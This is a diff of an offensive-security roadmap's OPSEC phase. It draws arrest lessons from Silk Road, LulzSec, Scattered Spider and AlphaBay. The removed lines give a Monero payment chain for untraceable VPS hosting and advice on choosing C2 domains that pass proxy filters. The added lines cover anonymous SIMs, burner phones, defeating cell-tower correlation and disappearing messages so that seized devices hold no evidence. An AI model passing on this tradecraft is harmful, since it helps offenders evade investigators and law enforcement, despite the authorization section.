@@ -53,8 +53,8 @@
      - Browser Exploitation & 1-Day Research *(V8, SpiderMonkey, patch diff)*
      - WebAssembly (Wasm) Attack Surface *(reversing, JIT bugs, WASI misconfig)*
      - AI / ML Attack Surface *(prompt injection, RAG poisoning, model extraction)*
-     - Offensive AI Workflows — AI as a Weapon *(local LLM, AI-assisted vuln research)*
-     - Offensive AI — Expanded 2027 *(agent hijacking chains, model theft, multimodal)*
+     - Offensive AI Workflows - AI as a Weapon *(local LLM, AI-assisted vuln research)*
+     - Offensive AI - Expanded 2027 *(agent hijacking chains, model theft, multimodal)*
    - **4E: APT Persistence, Rootkits & Anti-Forensics**
      - UEFI bootkits, LKM rootkits, ring-0 persistence
      - COM Hijacking, WMI Persistence, DLL Hijacking
@@ -89,7 +89,7 @@
      - Shadow Credentials Attack *(msDS-KeyCredentialLink, Whisker, pyWhisker)*
      - Timeroasting *(computer account RC4 hash, no-auth offline crack)*
      - ADCS ESC9–ESC15 *(UPN spoofing, weak mapping, ICPR relay, SubCA)*
-10. [Phase 5: GREATEST — The 0.0001%](#phase-5-greatest)
+10. [Phase 5: GREATEST - The 0.0001%](#phase-5-greatest)
     - Research methodology, original research paths, publication, mindset gap
 11. [Phase 6: Special Operations](#phase-6-special-operations) *(New in v4.5)*
     - Physical Red Team *(RFID cloning, tailgating, hardware implants)*
@@ -188,332 +188,2269 @@ Every phase is a prerequisite for the next. Skipping builds rotten foundations. 
 ---
 
 ## PHASE -1: OPSEC & INFRASTRUCTURE
-
-### Why This Comes First
-
-Most roadmaps bury OPSEC in Phase 4 or ignore it. This is wrong. OPSEC shapes every decision you make during training and operation. Build the habits before the skills. Skills practiced without OPSEC discipline become a liability when those skills matter.
-
-OPSEC is not paranoia. It is engineering: identify what you're protecting, model the threat, reduce surface, verify.
-
-### Checkpoint: What You Must Know
-By end of Phase -1, you should be able to:
-- ✓ Build and operate anonymous infrastructure (VPS, domains, redirectors) without attribution
-- ✓ Chain anonymization layers (VPN → Tor → proxy) and understand what each does and doesn't protect
-- ✓ Compartmentalize identities: work persona, research persona, personal identity, never mixing
-- ✓ Acquire and manage cryptocurrency anonymously for infrastructure payments
-- ✓ Understand metadata and how it burns operators (file metadata, EXIF, DNS leaks, timing correlation)
-- ✓ Configure a clean OS baseline for research
-- ✓ Understand what logging exists on every system you touch
+**Start here. Before Linux. Before Python. Before everything.**
 
 ---
 
-### Curriculum
+### TABLE OF CONTENTS
 
-#### **1. Threat Modeling & OPSEC Fundamentals**
-
-**Time:** 3–5 days | **Difficulty:** Low | **Prerequisite:** None
-
-| Resource | Type | Duration | Cost | Notes |
-|----------|------|----------|------|-------|
-| [OPSEC for Security Researchers](https://www.youtube.com/watch?v=oHSzqBPyN5I) | YouTube | 2 hours | FREE | DefCon talk. Practical, not theoretical. Start here. |
-| [Ranum's OPSEC Model](https://www.youtube.com/watch?v=9XaYdCdwiWU) | YouTube | 1 hour | FREE | Five-step process: identify, analyze, assess, countermeasures, evaluate. |
-| [Threat Modeling Manifesto](https://www.threatmodelingmanifesto.org/) | Web | 1 hour | FREE | Framework for thinking about adversaries and assets. |
-| [The Grugq - OPSEC & Tradecraft](https://www.youtube.com/results?search_query=grugq+opsec) | YouTube | 4 hours | FREE | Multiple talks. The Grugq is the reference on operational security. |
-
-**OPSEC Checklist: Research Environment**
-- [ ] Dedicated hardware for sensitive research (not daily driver)
-- [ ] Full disk encryption (LUKS, VeraCrypt) (no exceptions)
-- [ ] Separate browser profiles per identity: never cross-contaminate
-- [ ] Hostname randomized, MAC address changed at boot
-- [ ] System time synced to UTC: timezone metadata burns people
-- [ ] No personal accounts on research machines
-- [ ] Physical webcam/mic covered or hardware-disabled
+1. [Why This Comes Before Everything Else](#why-this-comes-before-everything-else)
+2. [Real Operators. Real Failures. Real Lessons.](#real-operators-real-failures-real-lessons)
+3. [The Legal Framework - Read This First](#the-legal-framework---read-this-first)
+4. [Threat Modeling - Think Before You Act](#threat-modeling---think-before-you-act)
+5. [Communication Security - The #1 Arrest Vector](#communication-security---the-1-arrest-vector)
+6. [Phone & Mobile OPSEC - The Device You Carry Everywhere](#phone--mobile-opsec---the-device-you-carry-everywhere)
+7. [Anonymous Infrastructure Setup](#anonymous-infrastructure-setup)
+8. [Anonymization Stack - VPN, Tor, and Chaining](#anonymization-stack---vpn-tor-and-chaining)
+9. [Browser Fingerprinting - You Are Being Identified](#browser-fingerprinting---you-are-being-identified)
+10. [Cryptocurrency - Why Monero and How It Actually Works](#cryptocurrency---why-monero-and-how-it-actually-works)
+11. [Identity Compartmentalization & Stylometry](#identity-compartmentalization--stylometry)
+12. [Secure Research OS](#secure-research-os)
+13. [Physical OPSEC - The Layer Most Guides Ignore](#physical-opsec---the-layer-most-guides-ignore)
+14. [Metadata - The Silent Killer](#metadata---the-silent-killer)
+15. [What Logs Exist on Every System You Touch](#what-logs-exist-on-every-system-you-touch)
+16. [Phase -1 Milestones Checklist](#phase--1-milestones-checklist)
+17. [Resources](#resources)
 
 ---
 
-#### **2. Anonymous Infrastructure Setup**
+### WHY THIS COMES BEFORE EVERYTHING ELSE
 
-**Time:** 1–2 weeks | **Difficulty:** Medium | **Prerequisite:** Basic Linux
+Most roadmaps bury OPSEC in a later phase or skip it entirely. This is catastrophically wrong.
 
-The goal: stand up infrastructure that cannot be trivially attributed to you. "Trivially" is the operative word: nation-state adversaries with legal compulsion are a different model. Assume your adversary is a corporate security team, not GCHQ.
+Here is why: **every operator who got caught was not caught because their exploit failed. They were caught because a human-layer decision burned them.** Reused a username. Emailed from a personal account. Texted about an operation from their real phone. Bought infrastructure with a credit card. Bragged in a chat room. Shipped a package to their real address.
 
-**VPS Acquisition (attribution-resistant):**
+The technical stack was functional. The human stack collapsed.
+
+OPSEC is not a tool you install after you learn to hack. It is a discipline you engrave into reflex **before** you write your first line of offensive code. Habits built early become automatic. Habits you try to add after the fact stay awkward, get skipped under pressure, and fail exactly when failure is most expensive.
+
+**The window to build good OPSEC habits is before the skills arrive. This is that window.**
+
+Build the habits now. They will protect everything you build after this.
+
+---
+
+### REAL OPERATORS. REAL FAILURES. REAL LESSONS.
+
+Study these. They are more instructive than any technical tutorial.
+
+---
+
+#### Ross Ulbricht - Silk Road
+
+**What he built:** A $1.2 billion darknet marketplace. Technical infrastructure was solid: Tor hidden services, Bitcoin payments, PGP communications.
+
+**How he was caught:** In 2011, before Silk Road launched, he posted on a Bitcoin forum asking for PHP developers. The account username: `altoid`. Six months later, another `altoid` post on a drug forum mentioned "a certain website." Investigators linked both. Then: a Gmail address he'd used for the `altoid` account included his real name. FBI traced him to a San Francisco public library, arrested him mid-session with his laptop open and unlocked.
+
+**The failure:**
+- Reused a username across unrelated contexts years apart
+- Used a personal email address for research activity
+- Operated in a public physical location
+
+**The lesson:** Username reuse and personal email contact with operational activity. Separated by years. Still fatal.
+
+---
+
+#### Hector Xavier Monsegur (Sabu) - LulzSec
+
+**What he did:** Core member of LulzSec, responsible for high-profile hacks against Sony, Fox, the CIA, and others.
+
+**How he was caught:** One night, under pressure, he logged into an IRC channel without connecting through Tor first. His real IP address was exposed for a few minutes. The FBI had been monitoring the channel. That single unprotected connection (one login, minutes) was enough to identify him.
+
+**The failure:** One moment of skipping the anonymization layer. One unprotected connection. That is all it took.
+
+**The lesson:** OPSEC discipline must be *automatic* and *consistent*. "Just this once without Tor" is how operators end. He then cooperated with the FBI for months, leading to arrests of his associates; a second lesson: your associates' OPSEC is also your exposure.
+
+---
+
+#### The Scattered Spider Crew - MGM, Caesars, Cloudflare
+
+**What they did:** Social engineering and AiTM phishing campaigns that netted hundreds of millions from major corporations.
+
+**How they were caught:** Not through technical failures. Through:
+- Chat logs from Telegram and Discord groups where they discussed operations
+- SIM swap activity traced back through carrier cooperation
+- A member bragging on social media
+- An associate who got scared and cooperated
+- Physical devices seized that contained operational communications in plaintext
+
+**The failure:** Unencrypted communications across platforms that cooperate with law enforcement. Operational discussions in group chats. OPSEC collapse at the communications layer.
+
+**The lesson:** The most technically sophisticated attack chains mean nothing if your communications are readable by law enforcement. This is why the communications section comes before everything else in this phase.
+
+---
+
+#### Aaron Swartz - MIT Network
+
+**What he did:** Downloaded ~4.8 million academic articles from JSTOR via MIT's network, intending to release them publicly.
+
+**How he was caught:** MIT network logs. His laptop was found physically connected to a network closet. Surveillance camera footage. Physical location data from university systems.
+
+**The failure:** No physical OPSEC. Physical device left in a network closet. University network logs. A location that could be surveilled.
+
+**The lesson:** Technical anonymity at the network layer means nothing if your physical presence is logged. Physical OPSEC is not optional.
+
+---
+
+#### AlphaBay Admin - Alexandre Cazes
+
+**What he did:** Ran AlphaBay, the largest darknet market at the time (2014–2017).
+
+**How he was caught:** A password reset email for AlphaBay was traced to a personal Hotmail address he'd held since 2008. That address contained his real name and had been used for personal activity. The Hotmail account also connected to a LinkedIn profile. Real identity confirmed. Thai police arrested him at his home.
+
+**The failure:** A personal email address used for operational password resets. An account that pre-dated operational activity and carried his real identity.
+
+**The lesson:** Any contact point between your real identity and your operational infrastructure is a chain that investigators can pull. Even a single email address.
+
+---
+
+#### Summary: The Universal Pattern
+
+| Operator | Technical Skill Level | Failure Vector |
+|---|---|---|
+| Ross Ulbricht | High | Username reuse + personal email |
+| Sabu (Monsegur) | High | One unprotected IRC login |
+| Scattered Spider | High | Plaintext operational comms |
+| Aaron Swartz | High | Physical location + device |
+| Alexandre Cazes | High | Personal email for password resets |
+
+**Pattern:** High technical skill. Human-layer failure. Every time.
+
+The OPSEC failures that end operators are almost never cryptographic or technical. They are habitual. They are a moment of laziness. They are one username reused, one text message sent from a real phone, one login without Tor. This phase exists to make those moments impossible through discipline that becomes reflex.
+
+---
+
+### THE LEGAL FRAMEWORK - READ THIS FIRST
+
+> **This section comes before any technical content. Not because it is the most important, but because not understanding it before you start is how people accidentally commit crimes while studying security.**
+
+---
+
+#### Authorization Changes Everything
+
+Every technique in this entire roadmap (from network scanning to exploit development) exists in two legal states depending on a single variable: **written authorization**.
+
+With authorization: penetration testing, security research, red teaming.
+Without authorization: criminal offense in virtually every jurisdiction.
+
+The line is not about intent. It is not about harm. It is not about whether you are "just learning." It is about permission. Get it in writing. Always.
+
 ```
-Payment chain: Cash → Bitcoin ATM → Bitcoin → Monero → Infrastructure
+Authorization document minimum elements:
+- Names of all parties (client, tester, company)
+- Scope: exactly which systems, IP ranges, domains are in scope
+- Out-of-scope: explicitly listed systems you may NOT touch
+- Time window: start date, end date, testing hours
+- Emergency contact: who to call if something breaks
+- Signature of someone with authority to grant permission
+- What data can be collected and how it must be handled
 
-1. Find a Bitcoin ATM that does not require ID under your threshold
-   - CoinATMRadar: https://coinatmradar.com (filter: no ID required)
-   - Typical no-ID limit: $250–$900 depending on jurisdiction
-
-2. Convert BTC to Monero (XMR): BTC is pseudonymous, XMR is private
-   - Bisq (decentralized, no KYC): https://bisq.network
-   - Haveno (Monero-native DEX, no KYC): https://haveno.exchange  ← LocalMonero closed Nov 2024, use this
-   - Monero.com built-in swap (Cake Wallet): https://monero.com
-
-3. Purchase VPS with Monero
-   - Njalla: https://njal.la (accepts XMR, no identity required)
-   - 1984 Hosting: https://1984.hosting (privacy-focused, Iceland)
-   - Cockbox: https://cockbox.org (accepts XMR)
-   - NEVER use AWS, GCP, Azure, DigitalOcean with anonymous payment:
-     they correlate payment methods regardless
-
-4. Connect to VPS only through Tor or a trusted VPN you also purchased anonymously
-   - Never connect with your real IP. First access sets the log pattern.
+Without these elements, the document provides no real protection.
 ```
 
-**Domain Registration (attribution-resistant):**
+---
+
+#### Key Laws to Know (By Region)
+
+**United States - Computer Fraud and Abuse Act (CFAA)**
+
+The primary federal computer crime law. Relevant provisions:
+- Section 1030(a)(2): accessing a computer without authorization to obtain information
+- Section 1030(a)(5): causing damage by knowingly transmitting code
+- "Without authorization" and "exceeding authorized access" are the critical phrases: both are crime triggers
+
+What matters for you: Unauthorized access to any computer connected to the internet is a federal offense. "I was just scanning" is not a defense. Port scanning without authorization has resulted in criminal charges in specific cases. Know where you are testing and have the paper.
+
+**European Union - NIS2 Directive + National Laws**
+
+Each EU country has its own computer crime law. Common examples:
+- Germany: §202a StGB (unauthorized data access), §303b StGB (computer sabotage)
+- UK: Computer Misuse Act 1990 (still in force post-Brexit): Sections 1, 2, 3 cover unauthorized access and modification
+- France: Articles 323-1 to 323-7 of the Penal Code
+
+**India - Information Technology Act 2000, Section 66**
+
+Punishes unauthorized access to computer systems. Also relevant: Section 43 (damage to computer) and Section 67 (publishing obscene material, relevant for social engineering research involving such content).
+
+**A Note on Jurisdiction**
+
+Where the computer is matters. Where you are matters. Both can apply simultaneously. A US-based researcher accessing a German server may face prosecution under both US and German law. VPNs and Tor complicate attribution but do not eliminate jurisdiction. The server's country, your country, and the route between them can all be legally relevant.
+
+---
+
+#### Mutual Legal Assistance Treaties (MLATs)
+
+MLATs are agreements between countries to share evidence and cooperate on criminal investigations. Key points:
+
+- The US has MLATs with most EU countries, Canada, Australia, and many others
+- When law enforcement in Country A wants records from a VPS provider in Country B, they submit an MLAT request
+- MLAT requests take weeks to months, which is why jurisdiction matters for your infrastructure choices
+- Iceland (1984.hosting) and some Eastern European jurisdictions have historically slow MLAT cooperation
+- No jurisdiction is completely immune; they just slow the process
+
+**Infrastructure choice is not just about privacy policy. It is about legal friction under compelled disclosure.**
+
+---
+
+#### The Researcher's Shield: Documentation
+
+If you engage in security research, maintain records:
+- Notes on what you tested and when
+- Evidence of authorization (if applicable)
+- Purpose of your research
+- What you found and what you did with it
+
+These records are the difference between "legitimate researcher" and "criminal" in the eyes of a prosecutor who wasn't there.
+
+---
+
+### THREAT MODELING - THINK BEFORE YOU ACT
+
+> **Threat modeling is the practice of thinking clearly about who might come after you, what they want, what they can do, and how to make their job harder. It prevents both paranoia (doing too much) and negligence (doing too little).**
+
+---
+
+#### The Five Questions - Answer All Five Honestly
+
+These come from the Electronic Frontier Foundation's framework and are the industry standard.
+
+**1. What do I need to protect?**
+
+Be specific. Not "my privacy", as that is too vague. Name the actual assets:
+- Your legal identity
+- Your physical location
+- The content of your research
+- Your operational tools and infrastructure
+- Your associations and collaborators
+- Your financial activity
+- Your communication history
+
+**2. Who am I protecting it from?**
+
+Name the actual adversaries for your specific situation. Be realistic:
+
+| Adversary | Capability | Likely Motivation |
+|---|---|---|
+| Platform abuse teams (Discord, GitHub, etc.) | Can see your activity on their platform | ToS violation, copyright, obvious threats |
+| Corporate security teams at target organizations | Can log your traffic hitting their systems | Detecting and stopping intrusions |
+| Law enforcement (local, national) | Can subpoena providers, seize hardware, compel testimony | Criminal prosecution |
+| Intelligence agencies (NSA, GCHQ, etc.) | Mass surveillance, traffic correlation, classified capabilities | National security threats |
+| Rival operators | Variable, depends on context | Competitive, ideological, or financial |
+| Journalists / OSINT researchers | Open-source tools, social graph analysis | Exposure, reporting |
+
+Most security researchers' realistic adversary set: **platform abuse teams** and **corporate security teams**. Not NSA. Calibrating to the right adversary set determines what level of protection you actually need.
+
+**3. How likely is it that I need to protect it?**
+
+A bug bounty hunter doing authorized research on HackerOne targets has a very different risk profile than someone studying malware samples. Be honest about your actual risk level. Paranoia wastes time and adds friction that erodes your OPSEC discipline over time.
+
+**4. How bad are the consequences if protection fails?**
+
+Map the actual consequences:
+- Platform ban / account suspension (minor)
+- Doxing / public exposure of identity (significant)
+- Civil lawsuit from a target organization (serious)
+- Criminal charges, arrest, prosecution (severe)
+- Physical danger (context-dependent, but real in some situations)
+
+**5. How much friction am I willing to accept?**
+
+Perfect OPSEC is total paralysis. Every additional protection layer adds latency, cost, and cognitive load. Find the level of protection that is sustainable for your actual threat model. The OPSEC you actually use is better than the perfect OPSEC you skip because it's too annoying.
+
+---
+
+#### OPSEC Is a Process, Not a Setup
+
+The military five-step OPSEC process:
+
 ```
-1. Njalla: resells domains, holds them in their name, accepts XMR
-   https://njal.la/domains/
+1. Identify Critical Information
+   What information, if obtained by an adversary, would hurt you?
+   (Your identity. Your location. Your tools. Your associates.)
 
-2. Epik: accepts crypto, WHOIS privacy included
-   https://www.epik.com
+2. Analyze Threats
+   Who are your adversaries? What are their capabilities?
+   (See the table above. Be realistic.)
 
-3. Domain selection for C2:
-   - Aged domains (1+ year old): less suspicious traffic patterns
-   - Category-appropriate: finance/health domains blend into corporate traffic
-   - Check: https://web.archive.org (history should match your category)
-   - Check: https://urlvoid.com (shouldn't be on blocklists)
-   - Check: https://mxtoolbox.com/SuperTool.aspx (clean MX/SPF/DKIM)
+3. Analyze Vulnerabilities
+   Where do you expose critical information?
+   (Metadata. Communications. Physical presence. Financial trails. Writing patterns.)
 
-4. Categorize your domain (important for proxy bypass):
+4. Assess Risk
+   Which vulnerabilities are actually likely to be exploited by your actual adversaries?
+   (Calibrate. Don't plan for NSA if your adversary is a corporate SOC.)
+
+5. Apply Countermeasures
+   Implement proportional protections.
+   (The rest of this phase.)
+```
+
+Repeat this process for every operation. OPSEC is not a one-time setup. It is an ongoing assessment.
+
+---
+
+#### Checkpoint: What You Must Know
+
+Before moving on, be able to answer:
+- ✓ Who are my specific adversaries in my specific context?
+- ✓ What am I protecting, specifically named?
+- ✓ What is my proportional protection level?
+- ✓ What activity is authorized in writing, and what is not?
+
+---
+
+### COMMUNICATION SECURITY - THE #1 ARREST VECTOR
+
+> **If one section in this phase saves you, it is this one. More operators have been caught through communication records than through any technical failure. The Scattered Spider crew had excellent technical tradecraft. Their communications were their downfall.**
+
+---
+
+#### The Fundamental Problem
+
+When you communicate digitally, you are creating records. Every record is a potential piece of evidence. The question is: who can access those records, under what circumstances, and how readable are they?
+
+Most people's default communications (SMS, WhatsApp, Discord, Telegram, email) are:
+- Logged on servers you do not control
+- Readable by the platform
+- Accessible to law enforcement with a legal request
+- Often accessible without notification to you
+- Sometimes sold to or shared with third parties
+
+Your communications must be designed so that even if someone gets the records, they cannot read them.
+
+---
+
+#### The Threat Spectrum
+
+| Platform | Encryption | Server Logs | Law Enforcement Cooperation | Risk Level |
+|---|---|---|---|---|
+| SMS / iMessage (standard) | None / carrier-level | Extensive | Cooperative | Very High |
+| WhatsApp | E2E (Signal protocol) | Metadata logged | Cooperative (metadata) | High |
+| Telegram | Partial (not default) | Logs content in cloud | Cooperative | High |
+| Discord | None for content | Extensive logs | Very cooperative | Very High |
+| Signal | E2E + sealed sender | Minimal | Cannot provide content | Low |
+| SimpleX Chat | E2E, no user IDs | No central server | No data to provide | Very Low |
+| Briar | E2E + Tor routing | No central server | No data to provide | Very Low |
+| Session | E2E, no phone number | Decentralized | No identifying data | Low |
+| Matrix/Element (self-hosted) | E2E optional | Depends on your server | Only your server | Very Low (if self-hosted) |
+| Proton Mail | E2E (between Proton users) | Metadata logged | Swiss law, some cooperation | Medium |
+
+---
+
+#### What Not to Use for Operational Communications
+
+**Telegram:**
+A common misconception: Telegram is "end-to-end encrypted." By default it is not. Regular chats are client-server encrypted (Telegram can read them). Only "Secret Chats" (one-to-one only, not group chats) use E2E encryption. Group chats in Telegram are never E2E encrypted. Telegram stores all regular chat content on their servers. They have cooperated with authorities in multiple jurisdictions. Do not use Telegram for anything operationally sensitive.
+
+**Discord:**
+Discord logs everything. IP addresses, message content, timestamps, read receipts, voice channel participation. Discord has an active law enforcement portal and responds quickly to legal requests. The Scattered Spider crew's Discord communications were a primary source of evidence. Do not use Discord for operational communications. It is fine for public gaming communities.
+
+**WhatsApp:**
+The content is E2E encrypted (Signal protocol). The metadata is not: who you talk to, when, how often, for how long: all collected and shared with Meta. Meta's legal cooperation with law enforcement is extensive. Metadata alone has been sufficient to establish criminal associations in prosecutions.
+
+**SMS:**
+Not encrypted at rest at carriers. Law enforcement can get it with a subpoena. Carriers log everything. Never use SMS for anything sensitive.
+
+**Email (standard):**
+Email is plaintext at rest and in transit unless explicitly encrypted with PGP/GPG or sent between providers that enforce TLS. Most people do not use encrypted email. If you must use email for sensitive communication, use PGP. Full stop.
+
+---
+
+#### What to Use
+
+##### Signal - Your Primary Tool
+
+Signal is the gold standard for operational communications. Why:
+
+- End-to-end encrypted using the Signal Protocol (the best public protocol that exists)
+- Sealed sender: the Signal server does not know who sent a message to whom, only that a message was delivered to a recipient
+- Disappearing messages: configure them. Use the shortest timer appropriate to your situation
+- Note-to-self: private encrypted notepad
+- Open source: the code has been audited by independent security researchers
+- Minimal metadata collection: Signal has produced their metadata under legal compulsion twice. Both times, the only data they had was the account creation date and the last connection date
+
+**Signal's weakness:** Requires a phone number to register. The phone number links Signal to a real-world identity if that number can be traced to you. See the Mobile OPSEC section for how to handle this.
+
+**Configuration for operational use:**
+```
+Settings → Privacy:
+  - Screen lock: ON
+  - Screen security (prevent screenshots): ON
+  - Incognito keyboard: ON (prevents keyboard from learning your typing patterns)
+
+Settings → Privacy → Advanced:
+  - Always relay calls: ON (prevents your IP from being exposed to call recipients)
+  - Sealed sender: ON (default)
+
+For every conversation:
+  - Disappearing messages: set to 1 week maximum, 1 day preferred, 1 hour for sensitive ops
+
+Settings → Notifications:
+  - Show: "No name or message" (prevents message content appearing on lock screen)
+```
+
+##### SimpleX Chat - No User IDs
+
+SimpleX Chat has no user IDs at all. Not phone numbers, not usernames, not email addresses. Each conversation generates a new queue identifier. The server relays messages but cannot link a sender's conversations together because there is no persistent identifier.
+
+- Decentralized: you can run your own SimpleX server
+- No phone number registration
+- E2E encrypted
+- Open source, audited
+
+Use SimpleX for communications where you want no identity linkage whatsoever. The UX is slightly less polished than Signal, but the privacy model is stronger.
+
+Download: https://simplex.chat
+
+##### Session - No Phone Number Required
+
+Session uses a decentralized network (Oxen blockchain nodes) to route messages. No phone number required: you get a Session ID at registration.
+
+- No account creation beyond generating a key pair
+- Onion routing for message delivery
+- E2E encrypted
+- Can be used on desktop without a phone
+
+Download: https://getsession.org
+
+##### Briar - Tor-Routed, Works Without Internet
+
+Briar routes all communications through Tor. It can also sync over Bluetooth or WiFi directly (no internet required). Useful for high-sensitivity situations where internet connectivity itself is a risk.
+
+- No central server
+- Tor routing by default
+- Can work offline over Bluetooth/WiFi
+- Android only (desktop beta exists)
+
+Download: https://briarproject.org
+
+##### Matrix / Element - Self-Hosted
+
+Matrix is a federated protocol. If you run your own homeserver, you control the logs, the encryption, and the data retention. Element is the most polished Matrix client.
+
+- E2E encryption by default in Element
+- Self-hosting removes third-party from the trust chain
+- Federation lets you communicate with other Matrix users
+- Requires technical setup to self-host (but that setup is in your wheelhouse by Phase 2)
+
+Self-hosting guide: https://matrix.org/docs/guides/installing-synapse
+
+##### PGP/GPG for Email
+
+If you must use email for sensitive information, use PGP encryption.
+
+```bash
+# Generate a key pair
+gpg --gen-key
+# Select: RSA and RSA, 4096 bits
+
+# Export your public key (share this)
+gpg --export --armor your@email.com > public_key.asc
+
+# Encrypt a message to a recipient (you need their public key imported)
+gpg --encrypt --armor --recipient recipient@email.com message.txt
+
+# Decrypt a message
+gpg --decrypt encrypted_message.asc
+
+# Import someone's public key
+gpg --import their_public_key.asc
+```
+
+Use Proton Mail if you want email that is E2E encrypted between Proton users without manual PGP setup.
+
+---
+
+#### Operational Communications Rules
+
+```
+1. Separate apps for separate identities.
+   Personal Signal: personal contacts, real number.
+   Operational Signal: registered on an anonymous SIM, separate device.
+   Never mix.
+
+2. Disappearing messages are not optional.
+   Every operational conversation has disappearing messages enabled.
+   If the device is seized, recent messages should not exist.
+
+3. Never discuss operations on non-encrypted platforms.
+   Not in Discord DMs. Not in Telegram group chats.
+   Not in email. Not in SMS. Not in iMessage.
+   Assume everything on those platforms is readable.
+
+4. Minimize what you say even on encrypted platforms.
+   Encryption protects content, not context.
+   "We're talking" is metadata. Keep communications minimal.
+
+5. Operational code: discuss systems and techniques in technical terms,
+   not descriptive terms. "Running the module against the target" is
+   better than naming the target, naming the attack, naming the outcome.
+   Less detail means less evidence if something goes wrong.
+
+6. Never brag.
+   Bragging is the leading cause of self-incrimination among capable operators.
+   The Scattered Spider crew bragged. They're in prison.
+```
+
+---
+
+### PHONE & MOBILE OPSEC - THE DEVICE YOU CARRY EVERYWHERE
+
+> **Your phone is the most dangerous device you own for OPSEC purposes. It knows your location 24/7. It has your real identity. It has your real contacts. It runs operating systems designed for data collection by manufacturers who cooperate with law enforcement. This section is how you manage that risk.**
+
+---
+
+#### Why Phones Are a Critical OPSEC Vector
+
+- **Location data:** Cell towers triangulate your position continuously. GPS logs it precisely. This data is retained by carriers and is subject to legal requests. You cannot be near a sensitive operation with your real phone.
+- **Device identifiers:** IMEI (hardware), IMSI (SIM). Both are logged by every cell tower you connect to. Your IMEI is effectively permanent; swapping SIMs doesn't change it.
+- **App data:** Every app you run is a potential data source. Most apps request permissions they do not need and log what they can.
+- **Cloud backup:** By default, iOS and Android back up to Apple/Google cloud services. Law enforcement can subpoena those backups. Disable cloud backup on all sensitive devices.
+- **Biometrics:** In some jurisdictions, law enforcement can legally compel you to unlock a device with your fingerprint or face. A PIN is protected by Fifth Amendment protections in the US that biometrics are not (this is actively litigated: know your jurisdiction).
+- **Microphone and camera:** Malware can activate them. Even without malware, apps with permissions can.
+
+---
+
+#### The Operational Phone Strategy
+
+**Personal phone:** Your real identity. Your personal contacts. Never touches sensitive research. Never near sensitive operational locations.
+
+**Research phone:** Separate device. Anonymous registration. Used exclusively for security research. Never with your personal phone.
+
+**Burner:** Used for single operations. Destroyed or deactivated after.
+
+These are different threat levels. Your strategy depends on your threat model. Minimum: personal phone stays completely separate from operational activity.
+
+---
+
+#### GrapheneOS - The Operational Android
+
+GrapheneOS is a hardened Android operating system for Google Pixel devices. It is:
+- Open source, publicly audited
+- Designed for maximum privacy and security
+- No Google services by default (optional sandboxed installation)
+- Maintained by a dedicated security-focused team
+- The OS choice for high-sensitivity use cases
+
+**Why Pixel?** GrapheneOS requires Pixel because Pixel has the best hardware security (Titan M security chip) and the best bootloader unlock/relock support. You can re-lock the bootloader after installation, which maintains hardware attestation.
+
+**Installation:**
+```
+1. Buy a Pixel phone (any current-generation Pixel supports GrapheneOS)
+   Do not buy from your carrier with a contract; buy unlocked, with cash if possible.
+
+2. Enable OEM unlock (Settings → Developer Options)
+
+3. Use the web installer at: https://grapheneos.org/install/web
+   (Requires Chrome or Chrome-based browser with WebUSB support)
+   The installer is the easiest path: it handles everything automatically.
+
+4. After installation:
+   - Do NOT sign in with any Google account
+   - Install F-Droid (open source app store): https://f-droid.org
+   - Install apps from F-Droid, not Google Play
+   - If you need a specific Google Play app, use GrapheneOS's sandboxed Google Play
+     (Settings → Apps → Install Google Play: it runs in a sandbox, no special permissions)
+
+Key GrapheneOS security settings:
+   - PIN instead of fingerprint (biometric compulsion risk)
+   - Auto reboot: set to 18 hours (locks device regularly if left unattended)
+   - USB peripherals: off when not in use (prevents USB attack surface)
+   - Sensors: disable camera/microphone access for most apps
+   - Network access: restrict unnecessary apps from network access
+   - Exploit protection: enabled by default, do not disable
+```
+
+**GrapheneOS resources:**
+- Official site: https://grapheneos.org
+- Forum: https://discuss.grapheneos.org
+- Features: https://grapheneos.org/features
+
+---
+
+#### SIM Card Acquisition Without Identity Linkage
+
+Registering a SIM with your real identity links every call, text, and data connection to you permanently. The solution depends on your jurisdiction.
+
+**United States:**
+Prepaid SIM cards can be purchased with cash at convenience stores, Walmart, Target, and similar. Major prepaid providers: T-Mobile Prepaid, TracFone, Mint Mobile, TextNow. Many activate without requiring ID. Purchase with cash. Activate away from your home and usual locations (your home IP and physical location are logged at activation).
+
+**European Union:**
+The EU requires SIM registration in most member states (Germany, France, Italy require ID). The UK requires registration since 2023. For EU operations, options narrow to: acquiring a SIM during travel in a non-EU jurisdiction, or using internet-based SIM alternatives (eSIM services that accept Monero, voice-over-IP numbers).
+
+**VoIP for Signal registration:**
+If a truly anonymous SIM is not accessible, register Signal using a VoIP number. JMP.chat (accepts Monero) provides XMPP-based phone numbers that can receive SMS. MySudo provides compartmentalized phone numbers. Register over Tor.
+
+**The IMEI problem:**
+Even with an anonymous SIM, the device's IMEI is broadcast to every tower. If your burner phone was ever powered on near your home or regular locations (which would correlate it to your identity through location patterns), it's potentially linkable. Best practice: purchase burner hardware with cash at a physical store, keep it completely separate from your regular devices, and never power it on near your home.
+
+---
+
+#### Device Compartmentalization Rules
+
+```
+Rule 1: Never carry your personal phone and operational phone simultaneously
+         to a sensitive location.
+         
+         If both are powered on near each other, cell tower logs associate them
+         to the same physical location. That association can link your operational
+         device to your real identity.
+
+Rule 2: Power off your personal phone before powering on your operational phone
+         in any sensitive location.
+         
+         Or: leave your personal phone at home.
+
+Rule 3: Faraday bags for high-sensitivity situations.
+         A Faraday bag blocks all radio signals (cell, WiFi, Bluetooth, GPS).
+         Device inside: no location data logged, no calls received.
+         Cost: $20–60. Source from Amazon or specialty electronics suppliers.
+         Test: put your phone in the bag, call it from another phone.
+         If it rings, the bag is faulty.
+
+Rule 4: Disable features you do not need.
+         Bluetooth: off when not in use (Bluetooth beacon detection is real)
+         WiFi: off when not in use (probe requests broadcast your device ID)
+         Location services: granular control per app, off by default for everything
+         AirDrop / Nearby Share: off
+
+Rule 5: Physical camera and microphone control.
+         Camera covers exist and are cheap. Use them.
+         For microphone: no easy physical solution: trust app permissions.
+         On GrapheneOS: revoke microphone permission from apps that don't need it.
+```
+
+---
+
+#### Checkpoint: What You Must Know
+
+- ✓ Understand why your personal phone cannot be near operational activity
+- ✓ Have a plan for operational communications that does not involve your personal device
+- ✓ Know how IMEI logging works and what it means for device compartmentalization
+- ✓ If using a dedicated research device: GrapheneOS installed, no personal accounts, no personal data
+
+---
+
+### ANONYMOUS INFRASTRUCTURE SETUP
+
+> **The goal: stand up infrastructure that cannot be trivially attributed to you. "Trivially" is the operative word. Nation-state adversaries with full legal compulsion are a different model. Assume your realistic adversary is a corporate security team or law enforcement with standard legal tools, not GCHQ running a classified program.**
+
+---
+
